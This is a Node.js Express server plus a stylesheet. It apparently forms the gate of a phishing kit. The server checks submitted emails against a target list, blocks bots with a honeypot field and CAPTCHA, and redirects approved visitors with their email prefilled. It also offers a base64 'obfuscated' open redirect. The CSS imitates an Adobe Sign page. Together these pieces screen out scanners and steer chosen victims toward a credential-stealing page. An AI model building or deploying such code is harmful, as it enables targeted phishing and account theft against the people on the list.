require('dotenv').config();

const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const rateLimit = require('express-rate-limit');

const app = express();
const PORT = process.env.PORT || 3000;
const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');
const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://yourdomain.com/complete';

let validEmails = new Set();
function loadEmails() {
  try {
    const data = fs.readFileSync(EMAIL_FILE, 'utf8');
    validEmails = new Set(data.split('\n').map(e => e.trim().toLowerCase()));
    console.log('[INFO] Email list loaded into memory');
  } catch (err) {
    console.error('[ERROR] Failed to read email list:', err);
  }
}
loadEmails();

const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 50,
  message: { valid: false, message: 'Too many requests, try again later.' },
});

app.use(cors());
app.use(express.json());
app.use(limiter);

// ✅ Email check route (used by frontend)
app.post('/api/check-email', async (req, res) => {
  const { email, captchaToken, middleName } = req.body;

  // Bot detection
  if (middleName && middleName.trim() !== '') {
    return res.status(403).json({ valid: false, message: 'Bot activity detected' });
  }

  // Basic format check
  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).json({ valid: false, message: 'Invalid email format' });
  }

  // CAPTCHA check
  if (!captchaToken) {
    return res.status(400).json({ valid: false, message: 'Captcha missing' });
  }

  try {
    const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `secret=${process.env.CLOUDFLARE_SECRET}&response=${captchaToken}`,
    });
    const verifyData = await verifyRes.json();
    if (!verifyData.success) {
      return res.status(400).json({ valid: false, message: 'Captcha verification failed' });
    }
  } catch (err) {
    return res.status(500).json({ valid: false, message: 'Captcha verification error' });
  }

  const normalizedEmail = email.toLowerCase();
  const isValid = validEmails.has(normalizedEmail);

  if (!isValid) {
    return res.status(404).json({ valid: false, message: 'Email not recognized' });
  }

  const redirectUrl = `${REDIRECT_BASE}?email=${encodeURIComponent(normalizedEmail)}`;
  return res.json({ valid: true, redirectUrl });
});

// ✅ Obfuscated redirection route
app.get('/forward', (req, res) => {
  try {
    const { data } = req.query;
    if (!data) return res.status(400).send('Missing redirect data');

    const decoded = Buffer.from(data, 'base64').toString('utf8');
    if (!/^https?:\/\//.test(decoded)) return res.status(400).send('Invalid redirect URL');

    res.redirect(decoded);
  } catch (e) {
    res.status(400).send('Invalid redirect format');
  }
});

app.listen(PORT, () => {
  console.log(`Backend running on http://localhost:${PORT}`);
});



















<style scoped>
.visually-hidden {
  position: absolute !important;
  height: 1px; width: 1px;
  overflow: hidden;
  clip: rect(1px, 1px, 1px, 1px);
  white-space: nowrap;
}
  html, body {
  height: 100vh;
  margin: 0;
  padding: 0;
  overflow: hidden;
  font-family: Arial, sans-serif;
  background-color: #FAF9F6;
  color: #000;
}

body {
  display: block;
}

/* Shared container layout */
.background,
.gate-container {
  position: fixed;
  top: 0;
  left: 0;
  height: 100vh;
  width: 100vw;
  display: flex;
  flex-direction: column;
  justify-content: flex-start;
  align-items: center;
  padding-top: 100px;
  box-sizing: border-box;
  overflow: hidden;
  background-color: #FAF9F6;
}

/* CAPTCHA scaling */
.cf-turnstile {
  transform: scale(0.9);
  transform-origin: center;
  height: auto !important;
  width: auto !important;
}

.instructions {
  text-align: center;
  max-width: 500px;
  padding: 1rem;
}

.adobe-sign-container {
  width: 100%;
  max-width: 600px;
  background: #ffffff;
  border-radius: 10px;
  box-shadow: 0 1px 20px rgba(0, 0, 0, 0.1);
  padding: 4rem;
  display: flex;
  flex-direction: column;
  justify-content: center;
  box-sizing: border-box;
  height: 50vh;
}

.header {
  display: flex;
  justify-content: center;
  margin-bottom: 1rem;
}

.logo-text {
  font-weight: bold;
  display: flex;
  align-items: center;
  gap: 1rem;
}

.success-check {
  font-size: 2rem;
  color: red;
  line-height: 1;
}

.content {
  text-align: center;
}

.form-wrapper {
  display: flex;
  flex-direction: column;
  align-items: center;
}

.email-input {
  width: 95%;
  max-width: 400px;
  padding: 0.6rem;
  border: 1px solid #818181;
  border-radius: 5px;
  font-size: 1rem;
  background-color: #fff;
  color: #000;
}

.action-button {
  background-color: transparent;
  color: #0078D4;
  padding: 0.6rem 1.5rem;
  border: 1.5px solid #0078D4;
  border-radius: 16px;
  cursor: pointer;
  margin-top: 1rem;
  font-size: 1rem;
  width: 50%;
  max-width: 380px;
}

.action-button:disabled {
  opacity: 0.6;
  cursor: default;
}

.action-button:hover:not(:disabled) {
  background-color: transparent;
}

.divider {
  height: 0;
  background-color: #e0e0e0;
  margin: 1rem 0;
}

.footer-container {
  text-align: center;
}

.footer-text,
.global-footer {
  font-size: 0.85rem;
  color: #333;
  margin-top: 0.5rem;
}

.error {
  color: red;
  font-size: 0.9rem;
  margin-top: 0.6rem;
}

/* Dark mode overrides */
@media (prefers-color-scheme: dark) {
  html, body {
    background-color: #121212;
    color: #ffffff;
  }

  .background,
  .gate-container {
    background-color: #121212;
    color: #ffffff;
  }

  .instructions p,
  .instructions h,
  .instructions {
    color: #ffffff;
  }

  .adobe-sign-container {
    background: #1e1e1e;
    color: #ffffff;
    box-shadow: 0 1px 20px rgba(255, 255, 255, 0.05);
  }

  .email-input {
    background-color: #2b2b2b;
    color: #ffffff;
    border-color: #444;
  }

  .action-button {
    color: #0078D4;
    border-color: #0078D4;
  }

  .footer-text,
  .global-footer {
    color: #aaaaaa;
  }

  .error {
    color: #ff6b6b;
  }
}
</style>
